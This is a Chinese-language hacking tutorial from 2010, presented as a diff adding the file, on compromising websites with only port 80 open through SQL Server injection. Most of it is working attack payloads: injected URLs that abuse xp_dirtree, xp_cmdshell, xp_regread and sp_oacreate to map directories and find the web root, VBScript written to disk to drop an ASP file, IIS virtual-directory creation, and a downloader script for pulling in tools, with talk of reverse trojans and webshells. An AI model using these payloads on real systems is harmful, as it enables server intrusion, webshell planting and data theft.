@@ -1,0 +1,394 @@
+拿下只开了80端口网站的几种方法2010-06-25 21:15第一种方法: 
+　　这个是<<怪异的SQL注入>>中介绍的方法
+
+　　利用sqlserver的xp_dirtree,好的我们先来将一下方法,然后再说其优劣处(在原文的基础上作了点补充)
+
+　　建立表
+
+　　语句：http://www.xxxxx.com/down/list.asp?id=1;create table dirs(paths varchar(1000))--
+
+　　返回：正常的信息!说明建表成功!继续!
+
+　　(建的比原文的大一点,因为我遇过名子很长的文件,删除了那个id,因为没有什么用
+
+　　语句：http://www.xxxxx.com/down/list.asp?id=1;insert dirs exec master.dbo.xp_dirtree ’c:\’ --
+
+　　返回：正常信息。说明写入C盘的所有目录成功了!爽!接下来就是取表了!暴它出来。(好像只有暴这种方法了)
+
+　　语句：http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from dirs)-
+
+　　返回：Microsoft OLE DB Provider for SQL Server 错误 80040e07
+
+　　将 varchar 值 ’@Inetpub’转换为数据类型为 int 的列时发生语法错误。
+
+　　再依次爆出表中的目录名称!
+
+　　语句：http://http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from
+
+　　dirs where paths not in( ’@Inetpub’))--
+
+　　返回：Microsoft OLE DB Provider for SQL Server 错误 80040e07
+
+　　将 varchar 值 ’test’转换为数据类型为 int 的列时发生语法错误。
+
+　　再依次爆出表中的目录名称!
+
+　　好我们继续
+
+　　语句：http://http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from
+
+　　dirs where paths not in( ’@Inetpub’,’test’))--
+
+　　返回：Microsoft OLE DB Provider for SQL Server 错误 80040e07
+
+　　将 varchar 值 ’haha’转换为数据类型为 int 的列时发生语法错误。
+
+　　再依次爆出表中的目录名称!
+
+　　好了,你应该知道怎么做了吧,哈哈,就是把得到的表名添到那个括号里,有多少就放多少吧,
+
+　　一点技巧:
+
+　　有时候你会发现当输入类似
+
+　　http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from dirs)-
+
+　　时不是显示出错,而是网页显示正常
+
+　　晕了吧,别紧张哈
+
+　　看看0<>(select top 1 paths from dirs) 说明返回是一个数字,
+
+　　哈哈,测试一下看看是多少吧
+
+　　100>(select top 1 paths from dirs)
+
+　　返回正常
+
+　　哈哈,用这种大于小于的方法很快就能猜出了
+
+　　好我们继续
+
+　　比如当出现
+
+　　59=(select top 1 paths from dirs)
+
+　　返回正常,
+
+　　ok,说明名字是59
+
+　　输入如下
+
+　　http://http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from
+
+　　dirs where paths not in( ’59’))--
+
+　　记得带上引号哟
+
+　　下面的方法就和原来的一样的了
+
+　　还有一个问题就是
+
+　　有时候用上面的方法输入59时,发现下一次的文件夹还是59
+
+　　这个是怎么回事情呢?
+
+　　呵呵,不知道你有没有注意过059和59是一样的?
+
+　　就是这个原因了,哈哈,
+
+　　http://http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from
+
+　　dirs where paths not in( ’059’))--
+
+　　发现显示下一个文件夹名字了,ok
+
+　　优缺点分析:
+
+　　优点就是所有的sqlserver用户都可以使用,因为xp_dirtree适用权限PUBLIC,
+
+　　缺点是显示的是目录下的所有文件夹的名字,而且排列好像是没有什么顺序的,总之在好几千好几万个文件夹里找你想要的文件夹是痛苦的.
+
+　　而且你知道了有那个文件夹也不能保证在根目录下,实在是痛苦的一件事情呀,很多时候是靠运气和耐力.
+
+　　祝你成功
+
+方法二:
+
+　　利用xp_cmdshell
+
+　　哈哈,这个大家一定很熟悉了吧,我就简单说一下
+
+　　建立表
+
+　　语句：http://www.xxxxx.com/down/list.asp?id=1;create table dirs(paths varchar(1000))--
+
+　　返回：正常的信息!说明建表成功!继续!
+
+　　(建的比原文的大一点,因为我遇过名子很长的文件,删除了那个id,因为没有什么用
+
+　　语句：http://www.xxxxx.com/down/list.asp?id=1;insert dirs exec master.dbo.xp_cmdshell ’dir c:\ /B/D’ --
+
+　　返回：正常信息。说明写入C盘的所有目录成功了!这里用了dir c:\ /B/D,哈哈,不知道/B/D什么作用就试验试验看
+
+　　语句：http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from dirs)-
+
+　　返回：Microsoft OLE DB Provider for SQL Server 错误 80040e07
+
+　　将 varchar 值 ’@Inetpub’转换为数据类型为 int 的列时发生语法错误。
+
+　　再依次爆出表中的目录名称!
+
+　　语句：http://http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from
+
+　　dirs where paths not in( ’@Inetpub’))--
+
+　　返回：Microsoft OLE DB Provider for SQL Server 错误 80040e07
+
+　　将 varchar 值 ’test’转换为数据类型为 int 的列时发生语法错误。
+
+　　再依次爆出表中的目录名称!
+
+　　方法同上,就不说了
+
+　　有时候我们也可以用下面的两个扩展来干些事情
+
+　　1)我们可以利用xp_availablemedia来获得当前所有驱动器,并存入dirs表中：
+
+　　5 ;insert dirs exec master.dbo.xp_availablemedia;--
+
+　　我们可以通过查询temp的内容来获得驱动器列表及相关信息
+
+　　(2)我们可以利用xp_subdirs获得子目录列表,并存入dirs表中：
+
+　　5 ;insert into dirs exec master.dbo.xp_subdirs ’c:\’ ;--
+
+　　优缺点分析:
+
+　　很明显了,这样就不会出现xp_dirtree那种所有目录都放在一起的情况了,只会显示一级目录,找起来方便多了.
+
+　　缺点也很明显,只有sa有这个权限,也有可能管理员删除了这个扩展(毕竟太强大了).
+
+　　方法三:
+
+　　这种方法很好
+
+　　下面这个是原文
+
+　　想到了使用adsutil.vbs程序,我是这样执行的
+
+　　a’;exec master..xp_cmdshell ’cmd /c cscript c:\inetpub\adminscrips\adsutil.vbs enum w3svc/1/root>a.txt’;--是不是很长啦通过它我们可以把iis里面第一个虚拟web站点的设置情况(当然包括它所在的实际目录咯)，导入到a.txt中对于a.txt的实际位置默认当然是c:\winnt\system32,其实这都不是问题，不过遇到管理员把adsutil.vbs，删了或是放到别的地方我们就没办法了(不可能自已用echo 命令写一个吧)
+
+　　第二步:用echo命令写下面的代码到c:\中,很多吗也不算吧
+
+.....xp_cmdshell ’echo set fso1=createobject("scripting.filesystemobject")>c:\read.vbs’;-- 
+.....xp_cmdshell ’echo Set WshShell = Wscript.createObject("Wscript.Shell")>>c:\read.vbs’ 
+;-- 
+..... 
+-------------------read.vbs--------------------------------- 
+set fso1=createobject("scripting.filesystemobject") 
+Set WshShell = Wscript.createObject("Wscript.Shell") 
+spa=WshShell.Environment("process")("windir") 
+set fil =fso1.opentextfile(spa & "\system32\aa.txt") 
+do while not fil.atendofstream 
+nr=fil.readline 
+if left(nr,4)="Path" then 
+pa=mid(nr,instr(nr,")") 3,len(nr)-instr(nr,")")-3) 
+exit do 
+end if 
+loop 
+set fil1 =fso1.opentextfile(pa &"\dd.asp",2,true) 
+fil1.writeline "" 
+---------------cut here-------------------------------------  
+
+
+　　第三步:当然就是执行read.vbs三,这样我们可以把aa.txt中的内容读出来找到web站点的实际路径
+
+　　然后写一个叫dd.asp的文件在web站的根目录中,能否成功试试就知道咯
+
+　　执行http://x.x.x.x/dd.asp
+
+　　返回:\xxx
+
+　　哈哈,的确是好方法,
+
+　　不过原文好像有点问题
+
+　　就是
+
+　　set fil =fso1.opentextfile(spa %2B "\system32\aa.txt")
+
+　　set fil1 =fso1.opentextfile(pa%2B"\dd.asp",2,true)
+
+　　两句提交时会出错
+
+　　于是我们想到了加号,和&的功能相同
+
+　　还有就是写点什么东西到dd.asp呢?写入pa,哈哈
+
+　　哈哈,改成了
+
+-------------------read.vbs--------------------------------- 
+set fso1=createobject("scripting.filesystemobject") 
+Set WshShell = Wscript.createObject("Wscript.Shell") 
+spa=WshShell.Environment("process")("windir") 
+set fil =fso1.opentextfile(spa "\system32\aa.txt") 
+do while not fil.atendofstream 
+nr=fil.readline 
+if left(nr,4)="Path" then 
+pa=mid(nr,instr(nr,")") 3,len(nr)-instr(nr,")")-3) 
+exit do 
+end if 
+loop 
+set fil1 =fso1.opentextfile(pa "\dd.asp",2,true) 
+fil1.writeline pa 
+---------------cut here--------------------------------------
+
+
+　　因为用浏览器提交时 号被转换成了空格,所以在提交的时候还应该把变成%2B,好了,应该可以了,如下
+
+-------------------read.vbs--------------------------------- 
+set fso1=createobject("scripting.filesystemobject") 
+Set WshShell = Wscript.createObject("Wscript.Shell") 
+spa=WshShell.Environment("process")("windir") 
+set fil =fso1.opentextfile(spa %2B "\system32\aa.txt") 
+do while not fil.atendofstream 
+nr=fil.readline 
+if left(nr,4)="Path" then 
+pa=mid(nr,instr(nr,")") 3,len(nr)-instr(nr,")")-3) 
+exit do 
+end if 
+loop 
+set fil1 =fso1.opentextfile(pa %2B "\dd.asp",2,true) 
+fil1.writeline pa 
+---------------cut here--------------------------------------
+
+
+如果发现1没有的话,我们可以该成2,3,4...........
+
+　　a’;exec master..xp_cmdshell ’cmd /c cscript c:\inetpub\adminscrips\adsutil.vbs enum w3svc/2/root>a.txt’;--
+
+　　但是这种方法只能在windows2000下使用,因为2003下新建的网站所在地址不是按照1234来排列的,好像是随机生成的,个人比较过几个2003下的
+
+　　地址,没有发现什么规律.
+
+　　优缺点分析
+
+　　同上xp_cmdshell不是每一个用户都可以用的!还有一个问题是adsutil文件不一定存在,或者不一定在那个路径上,当然如果你原意的话你可以用
+
+　　echo写一个(哈哈,老多老多行的哟),另外的一个问题是,如果主机上有很多站点怎么办?我遇到过一个有九个站点的主机,胆识只有第8个是有用
+
+　　的,晕了吧,很难有人有嗯那个耐性会坚持到那么多的,早就崩溃了或许.还有就是不能在2003下用!
+
+　　不过说实话,这个方法的确是一个好方法
+
+　　方法四:
+
+　　这个方法是要饭的提到的,通过xp_regread等从注册表里读出路径
+
+　　以下推荐，获取网页路径(通过存储过程达到对注册表的读取)：
+
+　　利用内置存储过程 xp_regread(读取注册表键值，权限public)：
+
+　　语句：http：//www.xxx.com/list.asp?classid=1;create TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test
+
+　　varchar(20) exec master..xp_regread @rootkey= HKEY_LOCAL_MACHINE , @key=
+
+　　SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\ , @value_name= / , values=@test OUTPUT insert into paths
+
+　　(path) values(@test)
+
+　　IIS的默认路径的在注册表中HKEY_LOCAL_MACHINE\ SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\
+
+　　利用爆字段将数据库的值读出来：
+
+　　语句：http：//www.xxx.com/list.asp?classid=1 and 0<>(select top 1 paths from newtable)--返回： Microsoft OLE DB Provider for
+
+　　ODBC Drivers 错误 80040e07 [Microsoft][ODBC SQL Server Driver][SQL Server]将 varchar 值 E：\www,,201 转换为数据类型为 int 的
+
+　　列时发生语法错误。
+
+　　这说明网页目录在E：\www，接下来也可以利用FSO直接写入ASP木马
+
+　　如果得不到网页目录，怎么办呢?前提你要猜到网站是否使用默认WEB，或者使用域名作为WEB。
+
+　　declare @o int exec sp_oacreate wscript.shell , @o out exec sp_oamethod @o, run , NULL,’ cscript.exe c：
+
+　　\inetpub\wwwroot\mkwebdir.vbs -w "默认 Web 站点" -v "e","e：\"’
+
+　　在默认的WEB站点下创建一个虚拟目录E，指向E：盘下。
+
+　　declare @o int exec sp_oacreate wscript.shell , @o out exec sp_oamethod @o, run , NULL,’ cscript.exe c：
+
+　　\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e browse’
+
+　　给虚拟目录e加上浏览属性不错吧。给自己开虚拟服务。想那些网页目录路径，头都快破了。这下给自己一个天开眼了。那传WEBSHELL利用MS
+
+　　SQL为我们的工作告了一段落了，接下来工作应该由你来了。
+
+　　哈哈,方法不错哟,通过注册表来读,方便快捷!
+
+　　优缺点分析：
+
+　　优点当然是方便快捷了。缺点是只能察看默认的iis站点的路径，如果不再默认的站点那就无能为力了(我用regsnape跟踪过)，如果在2003下
+
+　　那就是连默认的站点路径也不显示了!痛苦中
+
+　　顺便说两句，
+
+　　实际上除了找网站路径的方法外，还是有别的方法来继续入侵的，比如说通过tftp来上传反弹木马，或者是通过写一个iget.vbs来下载你想要
+
+　　的东东
+
+　　iget.vbs代码如下：
+
+－－－－－－－－－start－－－－－－－－－－ 
+Set xPost = createObject("Microsoft.XMLHTTP") 
+xPost.Open "GET",LCase(WScript.Arguments(0)),0 
+xPost.Send() 
+Set sGet = createObject("ADODB.Stream") 
+sGet.Mode = 3 
+sGet.Type = 1 
+sGet.Open() 
+sGet.Write(xPost.responseBody) 
+sGet.SaveToFile LCase(WScript.Arguments(1)),2 
+－－－－－－－－－－end－－－－－－－－－－－  
+
+
+　　对此文的在补充
+
+　　近日发现对毛主席大人的指示理解不够深刻，特在此表示补充
+
+　　实际上上面的各种方法根本就不需要比较了xp_dirtree是最好的，只要这一种方法就够了
+
+　　只是因为我当初太..............
+
+　　今日将xp_dirtree的秘密再挖一下
+
+　　好，我们exec master..xp_dirtree’d:/test’
+
+　　假设我们在test里有两个文件夹test1和test2在test1里又有test3
+
+　　结果显示
+
+　　subdirectory depth
+
+　　test1 1
+
+　　test3 2
+
+　　test2 1
+
+　　哈哈发现没有那个depth就是目录的级数
+
+　　ok了，知道怎么办了吧
+
+　　http://www.xxxxx.com/down/list.asp?id=1;create table dirs(paths varchar(1000),id int)--
+
+　　http://www.xxxxx.com/down/list.asp?id=1;insert dirs exec master.dbo.xp_dirtree ’d:\’ --
+
+　　http://www.xxxxx.com/down/list.asp?id=1 and 0<>(select top 1 paths from dirs where id=1)-
+
+　　只要加上id=1，就是第一级目录 。
+
+ 
